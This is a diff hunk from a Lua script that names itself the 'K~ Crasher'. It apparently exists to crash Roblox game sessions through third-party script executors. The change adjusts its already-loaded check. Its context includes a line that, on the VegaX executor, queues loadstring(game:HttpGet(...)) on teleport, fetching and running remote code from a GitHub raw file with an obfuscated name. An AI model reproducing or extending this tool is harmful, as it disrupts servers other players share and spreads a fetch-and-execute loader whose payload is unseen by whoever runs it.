@@ -54,8 +54,8 @@ _G.CrashSettings = {
 }
 
 if _G.CrashSettings.Enabled ~= true then return end
-if _G.KCLOADED == true then return task.spawn(error, 'K~ Crasher is already loaded!') end
-_G.KCLOADED = true
+if KCLOADED == true then return task.spawn(error, 'K~ Crasher is already loaded! 0x1') end
+getgenv().KCLOADED = true
 -- VegaX use only!
 if identifyexecutor() == "VegaX" then
 	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CrisomoX/makeBoom/main/iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua'))()")
